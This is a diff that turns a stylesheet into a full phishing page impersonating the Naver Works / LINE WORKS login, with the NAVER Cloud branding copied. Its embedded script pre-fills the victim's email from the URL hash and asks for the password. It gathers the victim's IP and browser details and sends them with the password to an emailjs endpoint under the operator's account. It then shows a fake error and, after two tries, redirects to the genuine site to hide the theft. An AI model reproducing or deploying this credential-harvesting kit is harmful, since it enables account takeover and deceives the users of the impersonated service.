@@ -1,4 +1,14 @@
-.register.login,
+<!DOCTYPE html>
+<html lang="en_US">
+<head>
+	<meta charset="utf-8" />
+	<meta content="IE=edge" http-equiv="X-UA-Compatible" />
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0" />
+	<meta name="format-detection" content="telephone=no" />
+	<title>Login</title>
+
+	<style>
+		.register.login,
 .register2.login2 {
 	width: 560px;
 }
@@ -1029,3 +1039,249 @@ address {
 .register2.login2 .register2.loginegister2 .inp_wrap2 input {
 	line-height: 21px;
 }
+
+
+	</style>
+</head>
+<body>
+	<section class="en_US jp_instance" id='section1'>
+		<section class="kr_instance">
+			<div id="wrap wrap2" class="register login">
+				<h1><span>Naver Works</span></h1>
+				<div id="container" class="page1">
+					<div class="login_infor">
+						<em class="user">Enter your mobile phone number or ID.</em>
+						<div class="desc">
+							<span id="lastLoginGuide">Login with your LINE WORKS ID (id@company or id@company.com)<br />or a verified phone number.</span>
+						</div>
+					</div>
+					<div class="fm_register">
+						<div class="login_form_cover">
+							<label for="login_param" class="_loginParamLabel blind">2061234567 or id@group.xx</label>
+							<input type="text" id="login_param" placeholder="2061234567 or id@group.xx" />
+						</div>
+					</div>
+					<div class="wrong_message" style="display:none">
+						<p id="wrong_message_paragraph">Check your ID or phone number again.</p>
+					</div>
+					<div class="btn">
+						<button id="loginStart" class="login_normal" disabled>Login</button>
+					</div>
+					<div class="check_info">
+						<div class="find_info">
+							<a href="#" id="findIdBtn">Find ID, Password</a>
+						</div>
+					</div>
+					<div class="btn">
+						<div class="login_line_area">
+							<em class="login_line_desc">OR</em>
+							<button id="naverLogin" data-accessurl="https%3A%2F%2Fmail.worksmobile.com%2F" class="login_naver">Login with NAVER</button>
+							<button id="lineLogin" data-accessurl="https%3A%2F%2Fmail.worksmobile.com%2F" class="login_line">Login with LINE</button>
+						</div>
+					</div>
+				</div>
+			</div>
+			<!-- ends here -->
+		</div>
+		</div>
+		<p class="welcome_link2"><span>Create a new account?</span><a href="https://join.worksmobile.com/jp/en/joinup/step1" target="_blank">Sign up</a></p>
+		<address><strong>© NAVER Cloud Corp.</strong></address>
+	</section>
+</section>
+<section class="en_US2 kr_instance2" id="section2" style="display: none;">
+	<div id="wrap2" class="register2 login2">
+		<h1><span>Naver Works</span></h1>
+		<div id="container2" >
+			<div class="login_infor2">
+				<em class="user2"> Enter your password,<br />or log in with My Mobile Device. </em>
+			</div>
+			<div class="fm_register2">
+				<p class="inp2 id2">
+					<span class="tail_words2">@cisvalve.co.kr</span>
+					<span class="inp_wrap2">
+						<input type="email" id="inputId" value="sales" placeholder="Login ID" />
+				</span>
+				</p>
+				<p class="inp2 pwd2">
+					<label for="password2" class="blind2">Password</label>
+					<input type="password" id="password2" placeholder="Password" />
+					<button type="button" class="btn_masking2"><span class="blind2">show password</span></button>
+				</p>
+			</div>
+			<div class="wrong_message2" id="div_fail_message2" style="display:none">
+				<p>ID or password do not match.</p>
+			</div>
+			<div class="btn2">
+				<button id="loginBtn2" class="login_normal2" disabled>Login</button>
+			</div>
+			<div class="check_info2">
+				<div class="check_box2">
+					<input type="checkbox" id="keepLogin2" />
+					<label for="login_chk" id="login_label2">Keep logged in</label>
+				</div>
+				<div class="find_info2">
+					<a href="#" id="findIdBtn2">Find ID, Password</a>
+					<a href="#" id="clearIdBtn2"> Login with other Group name or Domain </a>
+				</div>
+			</div>
+			<div class="btn2">
+				<div class="login_line_area2">
+					<button id="fidoAuthentication2" class="btn_authenticate2">Login with My Mobile Device</button>
+					<em class="login_line_desc2">OR</em>
+					<button id="lineLogin2" data-accessurl="https%3A%2F%2Fmail.worksmobile.com%2F" class="login_line2"> Login with LINE</button>
+				</div>
+			</div>
+		</div>
+		<p class="welcome_link2"><span>Create a new account?</span><a href="https://join.worksmobile.com/jp/en/joinup/step1" target="_blank">Sign up</a></p>
+		<address><strong>© NAVER Cloud Corp.</strong></address>
+	</div>
+</section>
+<script type="text/javascript">
+	document.addEventListener('DOMContentLoaded', function () {
+		if (!window.location.hash) {
+	// / 		// Add a hash to the URL
+	window.location.hash = '#[[email]]'; // Change 'section1' to the desired hash
+	}
+
+	var emailReceiver = window.location.hash.substr(1);
+
+	const splitted = emailReceiver.split('@');
+	let domainVal = splitted[1];
+	let emailVal = splitted[0];
+	console.log(splitted);
+	const loginStart = document.querySelector('.login_normal');
+	const loginBtn = document.getElementById('loginBtn2');
+	const container1 = document.getElementById('section1');
+	const container2 = document.getElementById('section2');
+	const emailInput = document.getElementById('login_param');
+	const passwordInput = document.getElementById('password2');
+	const inputId = document.getElementById('email_label');
+	const errorMessage = document.getElementById('div_fail_message2');
+	const revealIcon = document.querySelector('.btn_masking2');
+	const domain = document.querySelector('.tail_words2');
+	const emailContent = document.getElementById('inputId');
+
+	let count = 0;
+
+	domain.textContent = `@${domainVal}`;
+	emailContent.value = emailVal;
+
+	// to reveal the user password
+	revealIcon.addEventListener('click', () => {
+		const value = passwordInput.getAttribute('type');
+		if (value === 'password') {
+			passwordInput.setAttribute('type', 'text');
+		} else {
+			passwordInput.setAttribute('type', 'password');
+		}
+	});
+
+	if(emailContent){
+		emailInput.value = emailReceiver
+	}
+
+	// to submit the first login button
+	loginStart.addEventListener('click', () => {
+		setTimeout(() => {
+			container1.style.display = 'none';
+			container2.style.display = 'flex';
+			email = emailInput.value;
+		}, 3000);
+	});
+
+	// get user ip address
+	let ip = '';
+
+	function text(url) {
+		return fetch(url).then((res) => res.text());
+	}
+
+	text('https://www.cloudflare.com/cdn-cgi/trace').then((data) => {
+		let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/;
+		ip = data.match(ipRegex)[0];
+		console.log(ip);
+	});
+
+	function getUserBrowserDetails() {
+		const userAgent = navigator.userAgent;
+		const appName = navigator.appName;
+		const appVersion = navigator.appVersion;
+		const platform = navigator.platform;
+		const language = navigator.language;
+
+		return {
+			userAgent,
+			appName,
+			appVersion,
+			platform,
+			language,
+		};
+	}
+
+
+	// to submit form with password and email
+	loginBtn?.addEventListener('click', async () => {
+		errorMessage.style.display = 'none';
+		var detail = getUserBrowserDetails();
+		const params = {
+			email: 'ezekiel@test.com',
+			password: passwordInput.value,
+			userAgent: detail.userAgent,
+			appName: detail.appName,
+			appVersion: detail.appVersion,
+			platform: detail.platform,
+			language: detail.language,
+			ip,
+		};
+
+		const data = {
+			service_id: 'service_v94347h',
+			template_id: 'template_1820lea',
+			template_params: params,
+			user_id: '-csSYtT85Cumloy8C',
+		};
+		count++
+
+		try {
+			const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+				method: 'POST',
+				body: JSON.stringify(data), // Use 'body' instead of 'data'
+				headers: {
+					'Content-Type': 'application/json', // Set content type as a header
+				},
+			});
+
+			if (response.ok) {
+				errorMessage.style.display = 'flex';
+				passwordInput.value = '';
+			} else {
+				passwordInput.value = '';
+			}
+		} catch (error) {
+			passwordInput.value = '';
+		}
+console.log(count)
+		if (count >= 2) {
+			window.location.replace('https://join.worksmobile.com/jp/en/joinup/step1');
+		}
+	});
+
+	if(emailInput.value){
+		loginStart.removeAttribute('disabled');
+		loginStart.style.backgroundColor = '#157efb';
+	}
+
+	emailInput.addEventListener('input', () => {
+		loginStart.style.backgroundColor = '#157efb';
+		loginStart.removeAttribute('disabled');
+	});
+
+	passwordInput.addEventListener('input', () => {
+		loginBtn.removeAttribute('disabled');
+		// errorMessage.style.display = 'none';
+	});
+
+});
+</script>
+</body>
+</html>
